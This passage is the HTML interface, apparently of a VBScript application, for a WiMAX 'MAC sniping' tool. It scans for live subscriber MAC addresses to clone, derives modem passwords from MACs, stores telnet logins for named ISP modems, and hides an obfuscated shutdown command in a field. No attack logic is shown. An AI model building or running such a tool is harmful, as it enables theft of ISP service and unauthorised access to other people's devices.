<option value="A1">A1</option>
<option value="A2">A2</option>
<option value="A3">A3</option>
<option value="A4">A4</option>
<option value="A5">A5</option>
<option value="A6">A6</option>
<option value="A7">A7</option>
<option value="A8">A8</option>
<option value="A9">A9</option>
<option value="AA">AA</option>
<option value="AB">AB</option>
<option value="AC">AC</option>
<option value="AD">AD</option>
<option value="AE">AE</option>
<option value="AF">AF</option>
<option value="B0">B0</option>
<option value="B1">B1</option>
<option value="B2">B2</option>
<option value="B3">B3</option>
<option value="B4">B4</option>
<option value="B5">B5</option>
<option value="B6">B6</option>
<option value="B7">B7</option>
<option value="B8">B8</option>
<option value="B9">B9</option>
<option value="BA">BA</option>
<option value="BB">BB</option>
<option value="BC">BC</option>
<option value="BD">BD</option>
<option value="BE">BE</option>
<option value="BF">BF</option>
<option value="C0">C0</option>
<option value="C1">C1</option>
<option value="C2">C2</option>
<option value="C3">C3</option>
<option value="C4">C4</option>
<option value="C5">C5</option>
<option value="C6">C6</option>
<option value="C7">C7</option>
<option value="C8">C8</option>
<option value="C9">C9</option>
<option value="CA">CA</option>
<option value="CB">CB</option>
<option value="CC">CC</option>
<option value="CD">CD</option>
<option value="CE">CE</option>
<option value="CF">CF</option>
<option value="D0">D0</option>
<option value="D1">D1</option>
<option value="D2">D2</option>
<option value="D3">D3</option>
<option value="D4">D4</option>
<option value="D5">D5</option>
<option value="D6">D6</option>
<option value="D7">D7</option>
<option value="D8">D8</option>
<option value="D9">D9</option>
<option value="DA">DA</option>
<option value="DB">DB</option>
<option value="DC">DC</option>
<option value="DD">DD</option>
<option value="DE">DE</option>
<option value="DF">DF</option>
<option value="E0">E0</option>
<option value="E1">E1</option>
<option value="E2">E2</option>
<option value="E3">E3</option>
<option value="E4">E4</option>
<option value="E5">E5</option>
<option value="E6">E6</option>
<option value="E7">E7</option>
<option value="E8">E8</option>
<option value="E9">E9</option>
<option value="EA">EA</option>
<option value="EB">EB</option>
<option value="EC">EC</option>
<option value="ED">ED</option>
<option value="EE">EE</option>
<option value="EF">EF</option>
<option value="F0">F0</option>
<option value="F1">F1</option>
<option value="F2">F2</option>
<option value="F3">F3</option>
<option value="F4">F4</option>
<option value="F5">F5</option>
<option value="F6">F6</option>
<option value="F7">F7</option>
<option value="F8">F8</option>
<option value="F9">F9</option>
<option value="FA">FA</option>
<option value="FB">FB</option>
<option value="FC">FC</option>
<option value="FD">FD</option>
<option value="FE">FE</option>
<option value="FF">FF</option>
</select><span style="display: inline-block; width: 1px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
</span><label title ="Click to generate MAC. Requires Base MAC"><input  type="button" tabindex="3" name="genMacButton" value="Generate"
onclick="VBScript:generateMac" class="btn"></label>
</span><label title ="Click to Add MAC to List. Requires Base MAC"><input  type="button" tabindex="4" name="addMacButton" value=" Add "
onclick="VBScript:AddMactoGenList" class="btn"></label><input style="display:none" type="text" style="border: 1px solid #000000; width: 328px; font-size: 10; height: 21px; line-height:17px;" id="macIdTest" name="macIdTest" value="Vkxwgrzq#0v#0w#33#0i" readonly>
<input type="hidden" style="background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="previousTestedMAC"
value="NA" >
</div>
<div style="display: none; margin-bottom: 2px; margin-left:8px;margin-right:8px;border-bottom:solid 2px white; padding-bottom: 2px;">
<span style="display: none; width: 210px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Current MAC range to generate:</b></span><input style="display:none" type="text" style="border: 1px solid #000000; width: 328px; font-size: 10; height: 21px; line-height:17px;" id="macId2" name="macId2" value="ZlPd{#Wrro#Y613#^Vfulsw#e|=#|||{|||}`" readonly><br>
<input title ="Current MAC range to generate." type="text" style="display: none;border: 1px solid #000000; width: 228px;
font-size: 10; height: 21px; line-height:17px;" tabindex="6" id="macRangeTOScan" name="macRangeTOScan"
value="" readonly>                          
</div>
<hr>
<span style="float: left;display: inline-block; font-size: 12;margin-left:8px; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Generated List:</b></span> 
<span style ="float: right;margin-right:12px;">
<span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC to scan:</b></span> <span id="macLineNumber" style="margin-right:10px; display: inline-block; font-size: 12;margin-left:4px; color: White; font-weight: bold; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b></b></span>
<span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Live MAC:</b></span> <span id="macLiveCount" style=" display: inline-block; font-size: 12;margin-left:4px; color: White; font-weight: bold; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>0</b></span>
</span>
<div class="Content" title ="List of MAC to be process.">
<span id=TableArea></span>
</div>
<span style="display: inline-block; width: 70px;margin-left:8px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Log status:</b></span><br>
<textarea style="padding-left: 5px; margin-left:10px;margin-right:10px;height: 74px; width: 100%; font-size: 10; color: green; background-color: #000000;
font-weight: normal; margin-bottom: 2px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" title="Scan log area"
name="LogContents" rows="35" cols="100" readonly>Status idle...</textarea>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding:4px;">
<center>
<label title = "Check to Enable Allow to shutdown pc? Maybe requires ADMIN rights.."><input type="checkbox" id="chkShutDownSnipe" name ="chkShutDownSnipe" onclick="VBScript:GetChkShutDownSnipe" /><span id="shutdownPCLabel" name="shutdownPCLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Shutdown PC after scan.&nbsp;</span></label>
<label title = "Check to Enable Do not test all domain if 1 live is found."><input type="checkbox" id="chkDonotTestAll" name ="chkDonotTestAll" checked onclick="VBScript:GetChkDonotTestAll" style="display:inline;" /><span id="chkDonotTestAllLabel" name="chkDonotTestAllLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; display:inline;">&nbsp;Do not test ALL domain(Alive MAC found).&nbsp;</span></label>
<label style ="margin-left: 15px;" title = "Check to Enable Restore Default MAC after Scan"><input type="checkbox" id="chkEnableRestoreDefalutMac" name ="chkEnableRestoreDefalutMac"  onclick="VBScript:GeChkEnableRestoreDefalutMac" /><span id ="chkEnableRestoreDefalutMacLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Restore Default MAC after Scan&nbsp;</span></label>
<label style ="margin-left: 15px;" title = "Check to Enable Continue SNIPE on Access Denied ERROR."><input type="checkbox" id="chkEnablePersistentSnipe" name ="chkEnablePersistentSnipe" checked  onclick="VBScript:GeChkEnablePersistentSnipe" /><span id ="chkEnablePersistentSnipeLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Persistent SNIPE&nbsp;</span></label>
<label style ="margin-left: 15px;" title = "Check to Enable SMS Notifcation If Live MAC Found."><input type="checkbox" id="chkEnableSmsSnipe" name ="chkEnableSmsSnipe"   onclick="VBScript:GeChkEnableSmsSnipe" /><span id ="chkEnableSmsSnipeLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;SMS&nbsp;</span></label>
<br>
<div style="height: 6px;">
<!--comment-->
</div>
<input title ="Click to exit the tool." type="button" value=" Exit " onclick="VBScript:CloseWindowSnipe" class="MenuBtn">
<input title ="Clear all log and generated MAC list." type="button" value="Clear All" onclick="VBScript:ClearMacList" class="MenuBtn">
<label title ="Click to start hunt / snipe/ scan MAC. Requires generated MAC list"> <input type="button" id ="SnipeBtn" name="SnipeBtn" value="Snipe" onclick="VBScript:ChangeMacTestSnipe" class="MenuBtn"> </label>
<input title ="Click to stop MAC processing." type="button" value="STOP!" onclick="VBScript:StopMacProccessing" class="MenuBtn">
</center>
</td>
</tr>
</table>
</div>
<div cellpadding="0" class="panel" id="panel3">
<table class="nav">
<tr valign="top">
<td class="tabs tabs1" id="tabSub1" onclick="selPanelSub(1)">Sniped List</td>
<td class="tabs tabs0" id="tabSub2" onclick="selPanelSub(2)">IP Scanned  List</td>
</tr>
</table>
<div cellpadding="0" class="panel" id ="panelSub1">
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Sniped MAC list</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<span style="float: left;display: inline-block; font-size: 12;margin-left:8px; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC List:</b></span> 
<span style ="float: right;margin-right:12px;"><span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Total:</b></span> <span id="macLineNumberLive" style=" display: inline-block; font-size: 12;margin-left:4px; color: White; font-weight: bold; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b></b></span></span>
<div class="ContentLive" title ="List of LIVE MAC.">
<span id=TableAreaLive></span>
</div>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Edit Sniped MAC Info</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<tr>
<td style="background-color:#330000;">
<div style = "margin-left:8px;margin-top:5px;">
<input type="hidden" style="background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="liveMacEditFull"
value="" >
<input type="hidden" style="background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="liveMacEditHalfFull"
value="" >
<span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC:&nbsp; </b></span><input title ="Current Selected MAC" type="text" style=" padding-left:5px; width:125px; background-color: #FFFFFF;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;font-size: 12px; height: 22px;line-height: 16px;" size="17" id="liveMacEdit"
readOnly name="liveMacEdit"  value="Please select MAC">&nbsp;&nbsp;<span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Description:&nbsp; </b></span><input title ="Current Selected MAC" type="text" style="padding-left:5px; width:125px; background-color: #FFFFFF;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;font-size: 12px; height: 22px;line-height: 16px;" size="17" id="liveMacEditDesc"
onkeyup ="Vbscript:EditLiveMacLimitChar" onkeydown ="Vbscript:EditLiveMacLimitChar" name="liveMacEditDesc"  value="">
</div>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding:4px;">
<center>
<input title ="Click to exit the tool." type="button" value="Exit" onclick="VBScript:CloseWindowSnipe" class="MenuBtn">
<input title ="Sort Ascending LIVE MAC list." type="button" value="Sort MAC" onclick="VBScript:SortBtn" class="MenuBtn">
<input title ="Delete All LIVE MAC list." type="button" value="Delete All" onclick="VBScript:ClearLiveMacList" class="MenuBtn">
<input title ="Click to Save MAC Info." id ="btnSaveMacInfo" type="button" value="SAVE Info" onclick="VBScript:SaveEditLiveMacInfo" class="MenuBtn">
<input title ="Click to Test MAC Download Speed." id ="btnSaveMacInfoSpeed" type="button" value="SpeedTest" onclick="VBScript:SaveEditLiveMacInfoSpeed" class="MenuBtn">
</center>
</td>
</tr>
</table>
</div>
<div cellpadding="0" class="panel" id ="panelSub2">
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Live IP Scanned List</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<span style="float: left;display: inline-block; font-size: 12;margin-left:8px; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Live IP List:</b></span> 
<span style ="float: right;margin-right:12px;"><span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Total:</b></span> <span id="liveIpLineNumber" style=" display: inline-block; font-size: 12;margin-left:4px; color: White; font-weight: bold; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>0</b></span></span>
<div class="ContentLiveCrrntIpScan" title ="List of current live IP address.">
<span id=LiveIpTableArea></span>
</div>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Edit Live IP Scanned MAC Info</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<tr>
<td style="background-color:#330000;">
<div style = "margin-left:8px;margin-top:5px;">
<input type="hidden" style="background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="liveIpScanEditFull"
value="" >
<input type="hidden" style="background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="liveIpScanEditHalfFull"
value="" >
<span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC:&nbsp; </b></span><input title ="Current Selected MAC" type="text" style=" padding-left:5px; width:125px; background-color: #FFFFFF;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;font-size: 12px; height: 22px;line-height: 16px;" size="17" id="liveIpScanEdit"
readOnly name="liveIpScanEdit"  value="Please select MAC">&nbsp;&nbsp;<span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Description:&nbsp; </b></span><input title ="Current Selected MAC" type="text" style="padding-left:5px; width:125px; background-color: #FFFFFF;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;font-size: 12px; height: 22px;line-height: 16px;" size="17" id="liveIpScanEditDesc"
onkeyup ="Vbscript:EditLiveIpScanLimitChar" onkeydown ="Vbscript:EditLiveIpScanLimitChar" name="liveIpScanEditDesc"  value="">
</div>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding:4px;">
<center>
<input title ="Click to exit the tool." type="button" value=" Exit " onclick="VBScript:CloseWindowSnipe" class="MenuBtn">
<input title ="Sort Ascending Live IP Scan list." type="button" value="Sort MAC" onclick="VBScript:SortLiveIpScanBtn" class="MenuBtn">
<input title ="Delete All Live IP Scan list." type="button" value="Delete All" onclick="VBScript:ClearLiveIpScanList" class="MenuBtn">
<input title ="Click to Save MAC Info." id ="btnSaveIpScanInfo" type="button" value=" SAVE Info " onclick="VBScript:SaveEditLiveIpScanInfo" class="MenuBtn">
</center>
</td>
</tr>
</table>
</div>
</div>
<div cellpadding="0" class="panel" id="panel4">
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC Password Generator</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<div style="margin-left: 8px; margin-bottom: 5px; margin-top: 10px;">
<span style="font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>MAC Address: &nbsp;&nbsp;</b> </span>
<input title ="Enter MAC here." type="text" style="  padding-left:5px; padding-right:5px; background-color: #FFFFFF; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; font-size: 12px; height:22px; line-height:16px;" size="20" id="InputMacToGenPassword"
name="InputMacToGenPassword" onkeyup="VBScript:getMacGeneratedPassword" onkeydown="VBScript:getMacGeneratedPassword" 
onclick="VBScript:getMacGeneratedPassword" tabindex="1" value="Enter text here">&nbsp;&nbsp;
<input type="button" name="clearFieldGenField" value="Clear" onclick="VBScript:clearFieldInGenerator 1" class="btn">
<label title ="Click to Paste."><input  type="button" tabindex="3" name="btnPasteMacPassGen" value=" Paste "
onclick="VBScript:PasteTextMacPassUtility" class="btn"></label>
</div>
<div style="margin-bottom: 5px;">
<span style="font-size: 12; color: White; font-weight: normal; margin-left: 6px;
font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;"><b>MAC Password: </b></span>
<label title ="Click to COPY password."><input type="text" style=" padding-left:5px; padding-right:5px; border: 1px solid #000000; margin-left= 6px; width: 158px;
font-size: 14; height: 21px;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" id="OutmacPassword" name="OutmacPassword" onclick="VBScript:copyToClipBoard(OutmacPassword.value)"
value="" readonly></label>
&nbsp;
<input title ="Click to COPY password." type="button" name="genPassword" value="Copy" onclick="VBScript:copyToClipBoard(OutmacPassword.value)" class="btn">
</div>
</td>
</tr>
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Base 64 Encoder/Decoder</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<div style="margin-left: 8px; margin-bottom: 5px; margin-top: 10px;">
<center>
<input type="radio" name="UserOption" value="1" checked /><span style="font-size: 12;
color: White; font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">Encode</span>
<input type="radio" name="UserOption" value="2" /><span style="font-size: 12; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">Decode</span>
</center>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Enter text source: &nbsp;</b><br>
</span>
<input title ="Enter text to Encode / Decode." type="text" style="padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;font-size: 12px; height: 22px;line-height: 16px;" size="40" name="inputTextToEncodeDecode"
tabindex="2" onkeydown="VBScript:getEncodeDecodeText inputTextToEncodeDecode.value" 
onkeyup="VBScript:getEncodeDecodeText inputTextToEncodeDecode.value" onclick="VBScript:getEncodeDecodeText inputTextToEncodeDecode.value"
value="Enter text here">&nbsp;&nbsp;
<input type="button" name="clearEndodeDecodeBtn" value="Clear" onclick="VBScript:clearFieldInGenerator 2" class="btn">
<label title ="Click to Paste."><input  type="button" tabindex="3" name="btnPasteEncodeDecode" value=" Paste "
onclick="VBScript:PasteTextEncodeDecode" class="btn"></label>
</div>
<div style="margin-bottom: 5px;">
<span style="font-size: 12; color: White; font-weight: normal; margin-left: 6px;
font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;"><b>Endoded/Decoded result:</b><br>
</span>
<label title ="Click to COPY Endoded/Decoded result."><input type="text" style="padding-left:5px; padding-right:5px; border: 1px solid #000000; margin-left= 6px; width: 270px;
font-size: 12; height: 21px;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;line-height:17px;" id="outTextEncodeDecode" name="outTextEncodeDecode"
onclick="VBScript:copyToClipBoard(outTextEncodeDecode.value)" value="" readonly></label>
&nbsp;
<input title ="Click to COPY Endoded/Decoded result." type="button" name="genPassword" value="Copy" onclick="VBScript:copyToClipBoard(outTextEncodeDecode.value)" class="btn">
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding:4px;">
<center>
<input title ="Click to exit the tool." type="button" value=" Exit " onclick="VBScript:CloseWindowSnipe" class="MenuBtn">
</center>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding:4px;">
<div style="display: inline-block;"> 
<div style="height: 5px;">
<!--comment-->
</div>
<center>
<label title = "Enable advance pass on UserID and PASSWORD"><input type="checkbox" id="chkAdvancePass" name ="chkAdvancePass" onclick="VBScript:GetChkAdvancePass" style="display:inline;" /><span id="chkAdvancePassLabel" name="chkAdvancePassLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; display:inline;">&nbsp;Enable Advance Password&nbsp;</span></label>
</center>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; margin-left: 6px; width: 115px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Optional Password:</b></span>
<select  style=" font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="patternPassDropdwnList"
name="patternPassDropdwnList" onchange="" >
<option value="wimax">wimax</option>
<option value="gct">gct</option>
<option value="gemtek">gemtek</option>
</select>
<label title ="Select # of HEX digit."><span id = "spanNumberOfDigitHex" style="display: inline-block; width: 50px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>&nbsp;# Digit:</b></span>
<select  style=" font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="numberOfDigitHexDropdwnList"
name="numberOfDigitHexDropdwnList" onchange="" >
<option value="10">3 Hex Digit</option>
<option value="11">2 Hex Digit</option>
<option value="9">4 Hex Digit</option>
</select></label>
<input title ="Click to test result." type="button" value=" Test " onclick="VBScript:TestPattern" class="MenuBtn">
<div style="height: 5px;">
<!--comment-->
</div>
</div>
</td>
</tr>
</table>
</div>
<!--===============================================================-->
<!--tab5-->
<!--===============================================================-->
<div cellpadding="0" class="panel" id ="panel5">
<!--===============================================================-->
<!--SubTab-->
<!--===============================================================-->
<table class="nav">
<tr valign="top">
<td class="tabs tabs0" id="tabSubTel1" onclick="selPanelSubTelnet(1)">Telnet Setting</td>
<td class="tabs tabs0" id="tabSubTel2" onclick="selPanelSubTelnet(2)">Web / Extra Settings</td>
<td class="tabs tabs0" id="tabSubTel3" onclick="selPanelSubTelnet(3)">About</td>
</tr>
</table>
<!--tab5sub1-->
<div cellpadding="0" class="panel" id ="panelSubTel1">
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Register/Unregister AutoItX3.dll (<U>REQUIRED TO REGISTER!!!)</U></b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<div style="margin-left: 8px;margin-right: 8px; padding-top:5px;padding-bottom:5px;">
<center>
<input title ="Unregister AutoItX3.dll." type="button" value="Unregister DLL" onclick="VBScript:UnregAutoItDLL" class="MenuBtn">            
<input title ="Register AutoItX3.dll." type="button" value="Register DLL" onclick="VBScript:RegAutoItDLL" class="MenuBtn">          
<input title ="Test AutoItX3.dll." type="button" value="TEST DLL" onclick="VBScript:TestAutoItDLL" class="MenuBtn">          
</center>
</div>
</td>
</tr>
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Wimax Telnet Account (<U>NOTE: Select your PROPER device!!!</U>)</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<div style="width:100%;margin-top:2px; margin-bottom:2px; ">
<div style="float: left; width:60%; border-right: solid 1px white ;margin-bottom: 2px; padding-top:5px;padding-bottom:2px;">
<center>
<span style="display: inline-block; width: 75px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Username:</b></span>
<input title ="Enter TELNET username here." type="text" style=" padding-left:5px; padding-right:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="inputTelnetUname"
tabindex="1" value="Telnet Username">
<br>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 75px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Password:</b></span>
<input title ="Enter TELNET password here." type="text" style=" padding-left:5px; padding-right:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="inputTelnetPassowrd"
tabindex="1" value="Telnet Password">
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 75px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Telnet Host:</b></span>
<input title ="Enter TELNET Host / IP address here." type="text" style=" padding-left:5px; padding-right:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="inputTelnetHost"
tabindex="1" value="192.168.254.1">
<div style="height: 5px;">
<!--comment-->
</div>
<label title ="Click to load Telnet account."><input  type="button" tabindex="3" name="btnLoadTelnetDef" value=" Load default "
onclick="VBScript:LoadTelnetDefAccount" class="btn"></label>
<div style="height: 2px; border-top: solid 1px white; margin-top: 5px;">
<!--comment-->
</div>
<label title ="Select this for BM621 2009 device."><input type="radio" id="radiobtnDv235tG" name="SelectDeviceOption" value="DV235tG" onclick ="Vbscript:SelectDeviceOptionRadioBtnClick"/><span id="spanRadiobtnDv235tG" style="font-size: 12px;
color: White; font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;DV235t Globe&nbsp;</span></label>
<label title ="Select this for BM621 2009 device."><input type="radio" id="radiobtnDv235tS" name="SelectDeviceOption" value="DV235tS" onclick ="Vbscript:SelectDeviceOptionRadioBtnClick"/><span id="spanRadiobtnDv235tS" style="font-size: 12px;
color: White; font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;DV235t Smart&nbsp;</span></label>
</center>
</div>
<div style="float: left; width:40%; ">
<div style="margin-left: 10px; margin-right: 10px;"  >
<label title ="Select this for BM622m 2012 device."> <input type="radio" id="radiobtnBm622m2012" name="SelectDeviceOption" value="BM622m2012" checked onclick ="Vbscript:SelectDeviceOptionRadioBtnClick"/><span id="spanRadiobtnBm622m2012" style="font-size: 12px; color: White;
font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;BM622m 2012&nbsp;</span></label>
<label title ="Select this for BM622i 2011 device."> <input type="radio" id="radiobtnBm622i2011" name="SelectDeviceOption" value="BM622i2011" checked onclick ="Vbscript:SelectDeviceOptionRadioBtnClick"/><span id="spanRadiobtnBm622i2011" style="font-size: 12px; color: White;
